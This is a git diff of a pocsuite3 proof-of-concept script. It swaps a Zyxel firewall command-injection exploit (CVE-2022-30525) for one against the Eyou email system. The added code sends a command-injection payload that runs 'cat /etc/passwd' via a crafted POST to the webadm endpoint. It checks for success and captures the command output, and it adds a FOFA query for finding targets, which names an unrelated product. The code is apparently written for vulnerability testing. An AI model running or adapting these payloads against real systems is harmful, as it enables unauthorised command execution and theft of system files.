@@ -7,18 +7,18 @@ from pocsuite3.api import (
     VUL_TYPE,
 )
 
-class ZyxelFirewallPoc(POCBase):
-    vulID = "99513"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
+class YiYuanEmailPoc(POCBase):
+    vulID = "99216"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
     version = "1"  # 默认为1
     author = "ZorIqz"  # PoC作者的大名
-    vulDate = "2022-05-13"  # 漏洞公开的时间,不知道就写今天
-    createDate = "2022-07-16"  # 编写 PoC 的日期
-    updateDate = "2022-07-16"  # PoC 更新的时间,默认和编写时间一样
-    references = ["https://www.rapid7.com/blog/post/2022/05/12/cve-2022-30525-fixed-zyxel-firewall-unauthenticated-remote-command-injection/"]  # 漏洞地址来源,0day不用写
-    name = "Zyxel防火墙 未经身份验证的远程命令注入 Poc"  # PoC 名称
-    appPowerLink = "https://www.zyxel.com/tw/zh/"  # 漏洞厂商主页地址
-    appName = "USG FLEX 100, 100W, 200, 500, 700；USG20-VPN, USG20W-VPN；ATP 100, 200, 500, 700, 800"  # 漏洞应用名称
-    appVersion = "ZLD5.00 thru ZLD5.21"  # 漏洞影响版本
+    vulDate = "2021-04-12"  # 漏洞公开的时间,不知道就写今天
+    createDate = "2022-07-17"  # 编写 PoC 的日期
+    updateDate = "2022-07-17"  # PoC 更新的时间,默认和编写时间一样
+    references = ["https://mp.weixin.qq.com/s/KDlSyDn7DWwnnFeDednk8g"]  # 漏洞地址来源,0day不用写
+    name = "亿邮电子邮件系统远程命令执行漏洞 Poc"  # PoC 名称
+    appPowerLink = "https://www.eyou.net/"  # 漏洞厂商主页地址
+    appName = "亿邮电子邮件系统"  # 漏洞应用名称
+    appVersion = "all"  # 漏洞影响版本
     vulType = VUL_TYPE.COMMAND_EXECUTION  # 漏洞类型,类型参考见 漏洞类型规范表
     category = POC_CATEGORY.EXPLOITS.WEBAPP
     samples = []  # 测试样列,就是用 PoC 测试成功的网站
@@ -28,30 +28,30 @@ class ZyxelFirewallPoc(POCBase):
             执行任意命令或代码。攻击者可在服务器上执行任意命令，读写文件操作等，危害巨大。
         """  # 漏洞简要描述
     pocDesc = """
-            通过post传参方法，在url后拼接 /ztp/cgi-bin/handler ，
-            添加payload 即可
+            登陆页面-->随便输入账号密码-->点击登录按钮抓包-->进行漏洞复现
         """  # POC用法描述
+    fofa = 'app="猎鹰安全-金山V8+终端安全系统"'
     cmdRet = ""
 
     def _check(self):
         # 漏洞验证代码
-        url = f"{self.url}/ztp/cgi-bin/handler"
-        headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
+        url = f"{self.url}/webadm/?q=moni_detail.do&action=gragh"
+        headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": f"{self.url}",
+                         "Content-Type": "application/x-www-form-urlencoded",
                          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
                          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-                         "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
-                         "Connection": "close", "Content-Type": "application/json"}
-        json = {"command": "setWanPortSt", "data": "hi", "mtu": "", "port": "4", "proto": "dhcp",
-                      "vlan_tagged": "1", "vlanid": "5"}
+                         "Referer": f"{self.url}/?code=1", "Accept-Encoding": "gzip, deflate",
+                         "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8", "Connection": "close"}
+        data = {"type": "'|cat /etc/passwd||'"}
         result = []
 
         # 一个异常处理 , 生怕站点关闭了 , 请求不到 , 代码报错不能运行
         try:
-            res = requests.post(url=url, headers=headers, json=json, verify=False, timeout=9, allow_redirects=False, stream=True)
+            res = requests.post(url=url, headers=headers, data=data, verify=False, timeout=9, allow_redirects=False)
             # 判断是否存在漏洞
-            if res.status_code == 503 and "uid=" in res.text:
+            if res.status_code == 200 and "root:" in res.text:
                 result.append(url)
-                self.cmdRet = res.text.split("\n")[0].strip()
+                self.cmdRet = res.text.split("<body></body></html>")[1]
         except Exception as e:
             print(e)
         # 跟 try ... except是一对的 , 最终一定会执行里面的代码 , 不管你是否报错
@@ -93,4 +93,4 @@ def other_utils_func():
 
 
 # 注册 DemoPOC 类
-register_poc(ZyxelFirewallPoc)
+register_poc(YiYuanEmailPoc)
